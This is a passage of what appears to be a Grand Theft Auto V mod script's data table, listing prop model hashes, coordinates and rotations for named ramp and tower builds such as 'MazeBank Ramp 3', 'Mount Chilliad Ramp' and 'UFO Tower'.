                        {
                            3681122061, -93.1729, -829.876, 321.734, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -111.268, -841.319, 304.233, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -123.245, -848.891, 292.651, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -147.333, -864.12, 269.359, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -141.278, -860.292, 275.213, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -135.256, -856.485, 281.036, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -129.266, -852.699, 286.828, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -117.224, -845.084, 298.474, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -165.367, -875.521, 251.921, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -213.415, -905.895, 205.464, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -207.426, -902.108, 211.255, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -201.403, -898.301, 217.078, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -195.414, -894.515, 222.87, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -183.434, -886.942, 234.452, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -177.445, -883.156, 240.244, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -171.422, -879.348, 246.067, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -159.378, -871.734, 257.713, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -153.355, -867.927, 263.536, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -189.424, -890.728, 228.661, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -231.449, -917.296, 188.027, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -225.46, -913.509, 193.818, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -219.47, -909.723, 199.609, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -237.439, -921.082, 182.235, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -284.806, -951.016, 167.673, 28.5601,
                            -7.5132, 122.286, -1, 7
                        },
                        {
                            3681122061, -289.048, -953.697, 170.578, 34.1701,
                            -3.41509, 122.286, -1, 7
                        },
                        {
                            3681122061, -290.727, -954.757, 171.926, 37.23,
                            3.41509, 122.286, -1, 7
                        },
                        {
                            3681122061, -286.998, -952.399, 169.084, 31.62,
                            -1.36604, 122.286, -1, 7
                        },
                        {
                            3681122061, -282.375, -949.481, 166.27, 26.0101,
                            3.50047, 122.286, -1, 7
                        },
                        {
                            3681122061, -280.014, -947.991, 165.174, 21.4201,
                            -6.83019, 122.286, -1, 7
                        },
                        {
                            3681122061, -277.4, -946.336, 164.178, 17.8501,
                            -3.15896, 122.286, -1, 7
                        },
                        {
                            3681122061, -270.266, -941.827, 162.896, 4.59013,
                            -1.79292, 122.286, -1, 7
                        },
                        {
                            3681122061, -266.683, -939.562, 163.103, -6.11989,
                            -1.38738, 122.286, -1, 7
                        },
                        {
                            3681122061, -259.328, -934.913, 165.339, -17.8499,
                            -4.69576, 122.286, -1, 7
                        },
                        {
                            3681122061, -253.478, -931.22, 168.474, -26.01,
                            -4.18349, 122.286, -1, 7
                        },
                        {
                            3681122061, -248.103, -927.823, 172.247, -33.66,
                            -5.97642, 122.286, -1, 7
                        },
                        {
                            3681122061, -243.429, -924.868, 176.444, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -256.593, -933.187, 166.676, -22.4399,
                            -5.97641, 122.286, -1, 7
                        },
                        {
                            3681122061, -262.183, -936.72, 164.252, -14.2799,
                            -3.20165, 122.286, -1, 7
                        }, {
                            3681122061, -268.321, -940.597, 162.896,
                            0.000125527, -1.95033, 122.286, -1, 7
                        },
                        {
                            3681122061, -272.668, -943.344, 163.123, 8.67012,
                            -2.86014, 122.286, -1, 7
                        },
                        {
                            3681122061, -275.091, -944.877, 163.561, 12.7501,
                            -5.1226, 122.286, -1, 7
                        },
                        {
                            3681122061, -249.757, -928.867, 170.944, -31.11,
                            -6.0617, 122.286, -1, 7
                        },
                        {
                            3681122061, -251.566, -930.012, 169.653, -27.54,
                            -3.58585, 122.286, -1, 7
                        }
                    }
                }, {
                    'MazeBank Ramp 3', c._vector3(-75.72, -819.12, 327.5), {
                        {
                            3681122061, -82.9657, -818.944, 325.175, 0, -0,
                            91.03, -1, 11
                        }, {
                            3681122061, -91.0941, -819.089, 322.355, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        },
                        {
                            3681122061, -98.36, -819.224, 316.632, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        },
                        {
                            3681122061, -105.626, -819.358, 310.91, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -112.892, -819.492, 305.187, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -120.158, -819.626, 299.464, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -127.424, -819.761, 293.741, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        },
                        {
                            3681122061, -134.69, -819.895, 288.018, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -141.956, -820.029, 282.296, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -149.222, -820.163, 276.573, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        },
                        {
                            3681122061, -156.487, -820.298, 270.85, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -163.753, -820.432, 265.127, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -171.019, -820.566, 259.404, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -178.285, -820.701, 253.682, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -185.551, -820.835, 247.959, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -192.817, -820.969, 242.236, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -200.083, -821.103, 236.513, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        },
                        {
                            3681122061, -207.349, -821.238, 230.79, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -214.615, -821.372, 225.068, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -221.881, -821.506, 219.345, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -229.147, -821.641, 213.622, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -236.413, -821.775, 207.899, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -243.679, -821.909, 202.176, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -250.945, -822.043, 196.453, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        },
                        {
                            3681122061, -258.21, -822.178, 190.731, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -265.476, -822.312, 185.008, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -287.274, -822.715, 167.839, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        },
                        {
                            3681122061, -280.008, -822.58, 173.562, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -272.742, -822.446, 179.285, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        },
                        {
                            3681122061, -294.54, -822.849, 162.117, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -301.806, -822.983, 156.394, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -309.072, -823.118, 150.671, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -316.338, -823.252, 144.948, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -323.604, -823.386, 139.225, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        },
                        {
                            3681122061, -330.87, -823.52, 133.503, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        },
                        {
                            3681122061, -338.136, -823.655, 127.78, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -345.402, -823.789, 122.057, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -352.668, -823.923, 116.334, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -359.934, -824.057, 110.611, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -367.199, -824.192, 104.889, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -374.465, -824.326, 99.1657, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        },
                        {
                            3681122061, -381.731, -824.46, 93.4429, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -388.997, -824.595, 87.7201, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -396.263, -824.729, 81.9973, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -403.529, -824.863, 76.2745, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        }, {
                            3681122061, -411.479, -825.022, 68.7971, -19.78,
                            -3.43377e-005, 91.1094, -1, 11
                        }, {
                            3681122061, -410.795, -824.997, 70.5517, -38.2199,
                            0.00787841, 91.0529, -1, 11
                        },
                        {
                            3681122061, -411.96, -825.029, 69.097, -27.6,
                            1.15259e-005, 91.1095, -1, 11
                        }, {
                            3681122061, -412.719, -825.046, 67.8516, -10.58,
                            -2.92151e-006, 91.1095, -1, 11
                        }, {
                            3681122061, -413.903, -825.068, 67.2075, -3.21999,
                            5.66959e-007, 91.1095, -1, 11
                        }, {
                            3681122061, -415.378, -825.099, 66.7734, 3.68002,
                            -4.58236e-006, 91.1095, -1, 11
                        }, {
                            3681122061, -416.883, -825.126, 66.57, 9.66002,
                            -8.44435e-006, 91.1096, -1, 11
                        }, {
                            3681122061, -418.526, -825.157, 66.5571, 15.64,
                            -1.80093e-005, 91.1095, -1, 11
                        }, {
                            3681122061, -419.945, -825.184, 66.6727, 20.7001,
                            8.69782e-006, 91.1094, -1, 11
                        }, {
                            3681122061, -421.727, -825.218, 67.0936, 25.7601,
                            -2.09975e-005, 91.1095, -1, 11
                        },
                        {
                            3681122061, -422.006, -825.234, 66.966, 30.8199,
                            0.114757, 90.6829, -1, 11
                        },
                        {
                            3681122061, -429.913, -825.328, 71.6856, 30.8199,
                            0.114757, 90.6829, -1, 11
                        }
                    }
                }, {
                    'Ferris Spin', c._vector3(-1480.62, -1179.0, 2.5), {
                        {
                            1952396163, -1497.76, -1113.84, -3.08, -90,
                            6.14715e-007, 165.792, -1, 2
                        },
                        {
                            2475986526, -1461.92, -1216.88, 2.5836, -2.3048, -0,
                            -154.878, -1, 2
                        },
                        {
                            3291218330, -1465.62, -1217.64, 18, 166.516,
                            -5.12264e-006, 24.1717, -1, 2
                        },
                        {
                            3291218330, -1458.89, -1214.4, 18, -38.4956,
                            8.53774e-007, -153.982, -1, 2
                        },
                        {
                            2475986526, -1460.32, -1219.97, 4.3801, 12.6953, -0,
                            -154.878, -1, 2
                        },
                        {
                            2475986526, -1457, -1226.67, 11.8772, 31.7229, -0,
                            -154.382, -1, 2
                        },
                        {
                            2475986526, -1458.4, -1223.77, 7.9937, 23.6001,
                            -0.0916355, -154.918, -1, 2
                        },
                        {
                            2475986526, -1456.4, -1228.27, 14.9608, 48.674, -0,
                            -153.982, -1, 2
                        },
                        {
                            2475986526, -1456, -1229.07, 19.7441, 68.6628, -0,
                            -153.982, -1, 2
                        },
                        {
                            2475986526, -1456.2, -1228.47, 24.8276, 82.6252,
                            3.80938, -152.828, -1, 2
                        },
                        {
                            2475986526, -1456.9, -1226.47, 28.9111, 108.498,
                            -8.51368, -157.244, -1, 2
                        },
                        {
                            2475986526, -1458.59, -1223.37, 31.5945, 130.616,
                            -4.72983, -155.087, -1, 2
                        },
                        {
                            2475986526, -1460.59, -1218.38, 33.5779, 143.744,
                            -3.95611, -152.581, -1, 2
                        },
                        {
                            2475986526, -1462.79, -1214.28, 34.161, 163.63,
                            -2.68302, -155.763, -1, 2
                        }, {
                            2475986526, -1465.3, -1209.78, 32.5228, -172.187,
                            4.69576e-006, -152.192, -1, 2
                        }, {
                            2475986526, -1465.3, -1209.78, 32.5228, -172.187,
                            4.69576e-006, -152.192, -1, 2
                        }, {
                            2475986526, -1466.9, -1205.68, 29.0062, -155.178,
                            9.47689e-005, -153.087, -1, 2
                        }, {
                            2475986526, -1468.3, -1202.98, 24.1897, -131.11,
                            6.74481e-005, -153.088, -1, 2
                        }, {
                            2475986526, -1468.59, -1202.68, 19.3732, -107.429,
                            3.07358e-005, -153.087, -1, 2
                        },
                        {
                            2475986526, -1467.99, -1203.88, 13.5732, -89.6528,
                            -0.153235, -155.853, -1, 2
                        }, {
                            2475986526, -1467.11, -1205.68, 10.7072, -63.5491,
                            8.53774e-007, -156.504, -1, 2
                        },
                        {
                            4109455646, -1465.05, -1210.03, 7.9503, 9.53319,
                            1.38057, 24.2606, -1, 2
                        },
                        {
                            2975320548, -1460.95, -1218.79, 7.66, -29.9323,
                            -0.173323, 24.7221, -1, 2
                        },
                        {
                            2975320548, -1463.05, -1214.19, 6.7879, -6.50192,
                            1.391, 24.2651, -1, 2
                        }
                    }
                }, {
                    'Mount Chilliad Ramp', c._vector3(497.03, 5590.81, 794.99),
                    {
                        {
                            1952396163, -1497.76, -1113.84, -3.08, -90, -0,
                            165.792, 90, 3
                        },
                        {
                            2475986526, -1461.92, -1216.88, 2.5836, -2.3048, 0,
                            -154.878, 205.14, 3
                        },
                        {
                            3291218330, -1458.89, -1214.4, 18, -38.4956, 0,
                            -153.982, 211.95, 3
                        },
                        {
                            2475986526, -1460.32, -1219.97, 4.3801, 12.6953, 0,
                            -154.878, 205.672, 3
                        },
                        {
                            2975320548, -1463.05, -1214.19, 6.7879, -6.5,
                            -1.391, 24.2651, 24.4244, 3
                        },
                        {
                            3291218330, -1465.62, -1217.64, 18, 166.516, 180,
                            24.1717, 155.224, 3
                        },
                        {
                            4109455646, -1465.05, -1210.03, 7.9503, 9.5304,
                            -1.3806, 24.2606, 24.5148, 3
                        },
                        {
                            2975320548, -1460.95, -1218.79, 7.66, -29.9322,
                            0.1733, 24.7221, 27.9617, 3
                        },
                        {
                            2475986526, -1458.4, -1223.77, 7.9937, 23.6001,
                            0.0916, -154.918, 207.065, 3
                        },
                        {
                            2475986526, -1467.11, -1205.68, 10.7072, -63.5491,
                            0, -156.505, 224.303, 3
                        },
                        {
                            2475986526, -1457, -1226.67, 11.8772, 31.7229, 0,
                            -154.382, 209.411, 3
                        },
                        {
                            2475986526, -1456.4, -1228.27, 14.9608, 48.674, 0,
                            -153.982, 216.471, 3
                        },
                        {
                            2475986526, -1456, -1229.07, 19.7441, 68.6628, 0,
                            -153.982, 233.298, 3
                        }, {
                            2475986526, -1456.2, -1228.47, 24.8276, 81.7043,
                            -3.8094, -152.828, 252.429, 3
                        }, {
                            2475986526, -1456.9, -1226.47, 28.9111, 110.301,
                            171.486, -157.244, 312.201, 3
                        }, {
                            2475986526, -1458.59, -1223.37, 31.5945, 130.843,
                            175.27, -155.087, 325.759, 3
                        }, {
                            2475986526, -1460.59, -1218.38, 33.5779, 143.844,
                            176.044, -152.581, 327.979, 3
                        }, {
                            2475986526, -1462.79, -1214.28, 34.161, 163.648,
                            177.317, -155.763, 335.024, 3
                        },
                        {
                            2475986526, -1465.3, -1209.78, 32.5228, -172.187,
                            -180, -152.192, 331.971, 3
                        },
                        {
                            2475986526, -1466.9, -1205.68, 29.0062, -155.178,
                            -180, -153.087, 330.783, 3
                        },
                        {
                            2475986526, -1468.3, -1202.98, 24.1897, -131.11,
                            -180, -153.088, 322.332, 3
                        },
                        {
                            2475986526, -1468.59, -1202.68, 19.3732, -107.429,
                            -180, -153.087, 300.544, 3
                        }, {
                            2475986526, -1467.99, -1203.88, 13.5732, -89.6205,
                            0.1532, -155.853, 269.072, 3
                        },
                        {
                            3966705493, 509.842, 5589.24, 791.066, 0.141, 0,
                            65.3998, 65.3999, 3
                        },
                        {
                            3966705493, 520.5, 5584.38, 790.503, 5.441, 0,
                            65.3998, 65.4976, 3
                        },
                        {
                            3966705493, 531.057, 5579.54, 788.691, 12.441, 0,
                            65.3998, 65.9111, 3
                        },
                        {
                            3966705493, 568.672, 5562.32, 767.428, 40.7396, 0,
                            65.3998, 70.8685, 3
                        },
                        {
                            3966705493, 576.972, 5558.53, 759.566, 40.7396, 0,
                            65.3998, 70.8685, 3
                        },
                        {
                            3966705493, 560.174, 5566.2, 774.698, 35.0403, 0,
                            65.3998, 69.4512, 3
                        },
                        {
                            3966705493, 541.325, 5574.84, 785.49, 19.4409, 0,
                            65.3998, 66.6484, 3
                        },
                        {
                            3966705493, 551.066, 5570.37, 780.799, 27.5407, 0,
                            65.3998, 67.9049, 3
                        },
                        {
                            3966705493, 585.249, 5554.75, 751.745, 40.7396, 0,
                            65.3998, 70.8685, 3
                        },
                        {
                            3966705493, 618.334, 5539.62, 720.386, 40.7936, 0,
                            65.3998, 70.8829, 3
                        },
                        {
                            3966705493, 626.602, 5535.85, 712.547, 40.7396, 0,
                            65.3998, 70.8685, 3
                        },
                        {
                            3966705493, 610.065, 5543.4, 728.217, 40.7396, 0,
                            65.3998, 70.8685, 3
                        },
                        {
                            3966705493, 601.777, 5547.19, 736.076, 40.7396, 0,
                            65.3998, 70.8685, 3
                        },
                        {
                            3966705493, 593.507, 5550.97, 743.917, 40.7396, 0,
                            65.3998, 70.8685, 3
                        },
                        {
                            3966705493, 634.862, 5532.07, 704.725, 40.7396, 0,
                            65.3998, 70.8685, 3
                        },
                        {
                            3966705493, 643.121, 5528.29, 696.894, 40.7936, 0,
                            65.3998, 70.8829, 3
                        },
                        {
                            3966705493, 651.391, 5524.51, 689.053, 40.7396, 0,
                            65.3998, 70.8685, 3
                        },
                        {
                            3966705493, 659.651, 5520.73, 681.221, 40.7396, 0,
                            65.3998, 70.8685, 3
                        },
                        {
                            3966705493, 667.911, 5516.94, 673.389, 40.7396, 0,
                            65.3998, 70.8685, 3
                        },
                        {
                            3966705493, 676.171, 5513.17, 665.558, 40.7396, 0,
                            65.3998, 70.8685, 3
                        },
                        {
                            3966705493, 684.431, 5509.38, 657.727, 40.7396, 0,
                            65.3998, 70.8685, 3
                        },
                        {
                            3966705493, 692.691, 5505.61, 649.905, 40.7396, 0,
                            65.3998, 70.8685, 3
                        },
                        {
                            3966705493, 700.95, 5501.83, 642.074, 40.7396, 0,
                            65.3998, 70.8685, 3
                        },
                        {
                            3966705493, 709.22, 5498.05, 634.243, 40.7396, 0,
                            65.3998, 70.8685, 3
                        },
                        {
                            3966705493, 717.46, 5494.28, 626.431, 40.7396, 0,
                            65.3998, 70.8685, 3
                        },
                        {
                            3966705493, 725.72, 5490.5, 618.6, 40.7396, 0,
                            65.3998, 70.8685, 3
                        },
                        {
                            3966705493, 733.98, 5486.72, 610.778, 40.7396, 0,
                            65.3998, 70.8685, 3
                        },
                        {
                            3966705493, 742.6, 5482.78, 603.167, 36.9395, 0,
                            65.3998, 69.9005, 3
                        },
                        {
                            3966705493, 751.83, 5478.55, 596.335, 31.0392, 0,
                            65.3998, 68.5807, 3
                        },
                        {
                            3966705493, 761.71, 5474.02, 590.613, 24.5989, 0,
                            65.3998, 67.3986, 3
                        },
                        {
                            3966705493, 772.07, 5469.28, 586.08, 18.9288, 0,
                            65.3998, 66.5835, 3
                        },
                        {
                            3966705493, 782.84, 5464.34, 582.86, 11.5788, 0,
                            65.3998, 65.8427, 3
                        },
                        {
                            3966705493, 793.89, 5459.28, 581.117, 5.0787, 0,
                            65.3998, 65.485, 3
                        },
                        {
                            3966705493, 805.1, 5454.15, 580.876, -2.5212, 0,
                            65.3998, 65.4208, 3
                        },
                        {
                            3966705493, 816.17, 5449.08, 581.975, -7.6213, 0,
                            65.3998, 65.5917, 3
                        },
                        {
                            3966705493, 827.191, 5444.04, 584.582, -16.6212, 0,
                            65.3998, 66.3125, 3
                        },
                        {
                            3966705493, 837.681, 5439.24, 588.899, -24.421, 0,
                            65.3998, 67.3698, 3
                        },
                        {
                            2580877897, 522.61, 5584.49, 779.214, 79.7153,
                            -9.2252, 55.7018, 77.7612, 3
                        },
                        {
                            3862788492, 522.445, 5583.69, 779.551, -0.9197,
                            -69.229, -167.468, 184.555, 3
                        }
                    }
                }, {
                    'Airport Jump', c._vector3(-1221.55, -2939.2, 14.5), {
                        {
                            2475986526, -1242.08, -2931.15, 12.9924, -0.1046,
                            -3.33505e-009, 61.0607, -1, 4
                        }, {
                            2475986526, -1247.11, -2928.46, 15.013, -0.1046,
                            -3.33505e-009, 61.0607, -1, 4
                        }, {
                            2475986526, -1251.58, -2926.05, 16.7865, -0.1046,
                            -3.33505e-009, 61.0607, -1, 4
                        },
                        {
                            2475986526, -1254.69, -2924.35, 18.25, -0.1046,
                            -3.33505e-009, 61.0607, -1, 4
                        },
                        {
                            3966705493, -1276.69, -2912.99, 23.0019, 0, 0.05,
                            60.9705, -1, 4
                        }, {
                            2475986526, -1258.35, -2922.28, 20.2135, -0.1046,
                            -3.33505e-009, 61.0607, -1, 4
                        },
                        {
                            3966705493, -1270.89, -2916.22, 23.0123, 0, 0,
                            60.8909, -1, 4
                        },
                        {
                            3966705493, -1270.25, -2914.99, 23.0137, 0, 0,
                            60.8909, -1, 4
                        },
                        {
                            3966705493, -1274.87, -2909.4, 23.0049, 0, 0.05,
                            60.9705, -1, 4
                        },
                        {
                            3966705493, -1269.01, -2912.64, 22.9993, 0, 0.05,
                            60.9705, -1, 4
                        },
                        {
                            3966705493, -1267.87, -2915.44, 28.3632, 0, -0,
                            147.299, -1, 4
                        },
                        {
                            3966705493, -1272.13, -2918.33, 28.4791, 0, 0.05,
                            60.9705, -1, 4
                        },
                        {
                            3966705493, -1272.11, -2918.35, 25.6708, -0.48,
                            0.0499982, 60.9701, -1, 4
                        },
                        {
                            3966705493, -1277.93, -2915.14, 25.604, 0, 0.05,
                            60.9705, -1, 4
                        },
                        {
                            3966705493, -1279.69, -2909.85, 25.6358, 0, -0,
                            -151.239, -1, 4
                        },
                        {
                            3966705493, -1279.69, -2909.85, 28.4844, 0, -0,
                            -151.239, -1, 4
                        }, {
                            2475986526, -1261.82, -2920.38, 21.767, -0.1046,
                            -3.33505e-009, 61.0607, -1, 4
                        },
                        {
                            3966705493, -1273.65, -2907.11, 22.9763, 0, 0.05,
                            60.9705, -1, 4
                        },
                        {
                            3966705493, -1267.77, -2910.37, 22.9978, 0, 0.05,
                            60.9705, -1, 4
                        },
                        {
                            3966705493, -1266.49, -2908.08, 22.9987, 0, -0,
                            -119.462, -1, 4
                        },
                        {
                            3966705493, -1265.15, -2905.8, 23.0042, 0, -0,
                            -119.462, -1, 4
                        },
                        {
                            3966705493, -1266.44, -2905.21, 25.6255, 0, -0,
                            -118.761, -1, 4
                        },
                        {
                            3966705493, -1265.66, -2911.99, 25.6968, 0, 0,
                            -30.9603, -1, 4
                        },
                        {
                            3966705493, -1264.88, -2910.66, 25.6982, 0, 0,
                            -30.9603, -1, 4
                        },
                        {
                            3966705493, -1264.84, -2905.14, 25.624, 0, -0,
                            -118.761, -1, 4
                        },
                        {
                            3966705493, -1272.37, -2900.96, 25.6199, 0, -0,
                            -118.761, -1, 4
                        },
                        {
                            3966705493, -1276.35, -2903.91, 25.6214, 0, -0,
                            -151.239, -1, 4
                        },
                        {
                            3966705493, -1276.35, -2903.91, 28.4329, 0, -0,
                            -151.239, -1, 4
                        },
                        {
                            3966705493, -1272.37, -2900.96, 28.4385, 0, -0,
                            -118.761, -1, 4
                        },
                        {
                            3966705493, -1266.44, -2905.21, 28.437, 0, -0,
                            -118.761, -1, 4
                        },
                        {
                            3966705493, -1265.17, -2905.14, 28.3426, 0, -0,
                            -118.861, -1, 4
                        },
                        {
                            3966705493, -1271.09, -2902.58, 23.0057, 0, -0,
                            -119.462, -1, 4
                        },
                        {
                            3966705493, -1272.37, -2904.83, 22.9972, 0, -0,
                            -119.462, -1, 4
                        }
                    }
                }, {
                    'Airport Jump 2', c._vector3(-1081.90, -2598.74, 20.5), {
                        {
                            2475986526, -1098.36, -2631.17, 19, 0, -0, 152.671,
                            -1, 5
                        },
                        {
                            2475986526, -1100.26, -2634.64, 21.1976, 16.2002,
                            0.192059, 150.427, -1, 5
                        },
                        {
                            2475986526, -1102.26, -2638.02, 25.01, 26.7003,
                            0.178675, 149.261, -1, 5
                        },
                        {
                            2475986526, -1103.96, -2640.91, 29.04, 28.3717, -0,
                            146.82, -1, 5
                        },
                        {
                            1952396163, -1119.61, -2670.96, -5.125, 0, -0,
                            150.514, -1, 5
                        },
                        {
                            1952396163, -1119.61, -2670.96, -5.125, 0, -0,
                            150.401, -1, 5
                        }, {
                            3137065507, -1044.69, -2530.08, 20.4011, 94.8962,
                            4.26887e-007, 147.716, -1, 5
                        }
                    }
                }, {
                    'UFO Tower', c._vector3(145.50, -705.90, 47.5), {
                        {
                            3026699584, 70.2592, -674.044, 654.365, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 646.186, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 638.008, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 629.829, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 621.65, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 613.471, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 605.292, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 597.114, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 588.935, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 580.756, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 572.577, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 564.399, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 556.22, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 662.544, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 548.041, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 539.862, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 531.683, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 523.505, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 515.326, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 507.147, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 498.968, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 490.79, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 482.611, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 474.432, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 466.253, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 458.074, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 449.896, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 441.717, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 433.538, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 425.359, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 417.18, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 409.001, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 400.823, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 392.644, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 384.465, 0.660085,
                            -0.919939, -109.32, -1, 6
                        },
                        {
                            3026699584, 70.2592, -674.044, 376.286, 0.660085,
